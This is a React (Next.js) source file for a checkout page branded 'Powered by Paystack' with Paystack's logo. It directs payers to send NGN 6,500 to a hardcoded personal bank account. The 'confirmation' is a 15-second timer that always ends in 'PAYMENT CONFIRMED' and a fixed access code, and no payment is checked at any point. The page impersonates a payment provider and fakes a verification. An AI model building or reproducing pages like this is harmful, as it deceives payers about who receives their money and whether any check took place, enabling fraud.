"use client";

import { useState } from "react";

export default function PaymentPage() {
  const [email, setEmail] = useState("");
  const [showTransfer, setShowTransfer] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [paymentDone, setPaymentDone] = useState(false);
  const [showCode, setShowCode] = useState(false);

  const copyAmount = () => {
    navigator.clipboard.writeText("6500");
    alert("Amount copied");
  };

  const copyAccount = () => {
    navigator.clipboard.writeText("2045641769");
    alert("Account number copied");
  };

  const handlePayment = () => {
    setShowLoading(true);

    setTimeout(() => {
      setShowLoading(false);
      setPaymentDone(true);
    }, 15000);
  };

  return (
    <main className="min-h-screen bg-[#f5f1ea] p-6">

      {!showTransfer && !showLoading && !paymentDone && (
        <div>

          <div className="mb-8">
            <h2 className="text-3xl text-black font-semibold mb-4">
              Amount
            </h2>

            <input
              type="text"
              value="₦6,500"
              readOnly
              className="w-full h-20 rounded-xl border border-gray-400 px-6 text-2xl bg-white text-black font-bold"
            />
          </div>

          <div className="mb-8">
            <h2 className="text-3xl text-black font-semibold mb-4">
              Full Name
            </h2>

            <input
              type="text"
              placeholder="Your full name"
              className="w-full h-20 rounded-xl border border-gray-400 px-6 text-2xl bg-white text-black placeholder:text-gray-500"
            />
          </div>

          <div className="mb-10">
            <h2 className="text-3xl text-black font-semibold mb-4">
              Your Email Address
            </h2>

            <input
              type="email"
              placeholder="email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full h-20 rounded-xl border border-gray-400 px-6 text-2xl bg-white text-black placeholder:text-gray-500"
            />
          </div>

          <button
            onClick={() => setShowTransfer(true)}
            className="w-full bg-green-600 text-white text-2xl font-bold py-5 rounded-xl"
          >
            Proceed
          </button>

          <div className="mt-16 flex justify-center items-center gap-2">
            <p className="text-2xl text-black">
              Powered by
            </p>

            <img
              src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Paystack_Twitter.jpg"
              alt="paystack"
              className="w-7 h-7 rounded-full"
            />

            <p className="text-2xl text-black font-semibold">
              Paystack
            </p>
          </div>

        </div>
      )}

      {showTransfer && !showLoading && !paymentDone && (
        <div>

          <div className="flex justify-between items-center mb-10">
            <h1 className="text-2xl text-black font-semibold">
              Bank Transfer
            </h1>

            <button
              onClick={() => setShowTransfer(false)}
              className="text-red-500 text-2xl"
            >
              Cancel
            </button>
          </div>

          <div className="flex justify-between items-center mb-16">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Paystack_Twitter.jpg"
              alt="paystack"
              className="w-16 h-16 rounded-full"
            />

            <div className="text-right">
              <h2 className="text-4xl font-bold text-black">
                NGN 6,500
              </h2>

              <p className="text-2xl text-black mt-2">
                {email}
              </p>
            </div>
          </div>

          <h2 className="text-3xl text-black leading-relaxed mb-12 font-medium">
            Proceed to your bank app to complete this Transfer
          </h2>

          <div className="border border-gray-500 p-8 bg-[#f5f1ea]">

            <div className="mb-10">
              <p className="text-2xl text-black mb-2">
                Amount
              </p>

              <div className="flex justify-between items-center">
                <h2 className="text-4xl font-bold text-black">
                  NGN 6,500
                </h2>

                <button
                  onClick={copyAmount}
                  className="bg-green-600 text-white px-6 py-2 text-xl rounded-lg"
                >
                  Copy
                </button>
              </div>
            </div>

            <div className="mb-10">
              <p className="text-2xl text-black mb-2">
                Account Number
              </p>

              <div className="flex justify-between items-center">
                <h2 className="text-4xl font-bold text-black">
                  2045641769
                </h2>

                <button
                  onClick={copyAccount}
                  className="bg-green-600 text-white px-6 py-2 text-xl rounded-lg"
                >
                  Copy
                </button>
              </div>
            </div>

            <div className="mb-10">
              <p className="text-2xl text-black mb-2">
                Bank Name
              </p>

              <h2 className="text-4xl font-bold text-black">
                Paga Bank
              </h2>
            </div>

            <div className="mb-14">
              <p className="text-2xl text-black mb-2">
                Account Name
              </p>

              <h2 className="text-4xl font-bold text-black">
                Abdullahi Muhammad
              </h2>
            </div>

            <div className="border-t border-gray-500 pt-10">
              <p className="text-2xl text-black mb-10">
                Pay to this specific account and get your access code
              </p>

              <button
                onClick={handlePayment}
                className="w-full bg-green-600 text-white text-2xl py-5 rounded-xl font-bold"
              >
                I have made this bank transfer
              </button>
            </div>

          </div>
        </div>
      )}

      {showLoading && (
        <div>

          <div className="flex justify-between items-center mb-10">
            <h1 className="text-2xl text-black font-semibold">
              Bank Transfer
            </h1>

            <button className="text-red-500 text-2xl">
              Cancel
            </button>
          </div>

          <div className="flex justify-between items-center mb-16">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Paystack_Twitter.jpg"
              alt="paystack"
              className="w-16 h-16 rounded-full"
            />

            <div className="text-right">
              <h2 className="text-4xl font-bold text-black">
                NGN 6,500
              </h2>

              <p className="text-2xl text-black mt-2">
                {email}
              </p>
            </div>
          </div>

          <h2 className="text-3xl text-black leading-relaxed mb-20 font-medium">
            Proceed to your bank app to complete this Transfer
          </h2>

          <div className="flex flex-col items-center justify-center mb-20">

            <div className="w-20 h-20 border-[10px] border-gray-300 border-t-green-600 rounded-full animate-spin mb-10"></div>

            <p className="text-3xl text-black text-center">
              Wait while we confirm your payment...
            </p>
          </div>

          <div className="bg-gray-100 border border-gray-300 p-8 mb-10">
            <div className="flex justify-between items-center">
              <p className="text-3xl text-black">
                Payment Made
              </p>

              <div className="w-8 h-8 border-2 border-green-500 rounded-md"></div>
            </div>
          </div>

          <div className="bg-gray-100 border border-gray-300 p-8">
            <div className="flex justify-between items-center">
              <p className="text-3xl text-black">
                Confirming Payment
              </p>

              <div className="w-10 h-10 border-[6px] border-gray-300 border-t-green-600 rounded-full animate-spin"></div>
            </div>
          </div>

        </div>
      )}

      {paymentDone && (
        <div className="text-center pt-20">

          <div className="w-72 h-72 bg-green-500 rounded-full mx-auto flex items-center justify-center">
            <span className="text-white text-[150px]">
              ✓
            </span>
          </div>

          <h1 className="text-green-600 text-6xl font-bold mt-12">
            PAYMENT CONFIRMED
          </h1>

          <p className="text-2xl text-black mt-8">
            Your payment has been confirmed successfully
          </p>

          {!showCode && (
            <button
              onClick={() => setShowCode(true)}
              className="mt-14 bg-green-600 text-white text-2xl px-10 py-5 rounded-xl font-bold"
            >
              Reveal Code
            </button>
          )}

          {showCode && (
            <div className="mt-14 bg-white border border-gray-400 rounded-xl p-8 text-6xl font-bold tracking-[20px] text-black">
              81636
            </div>
          )}

        </div>
      )}

    </main>
  );
}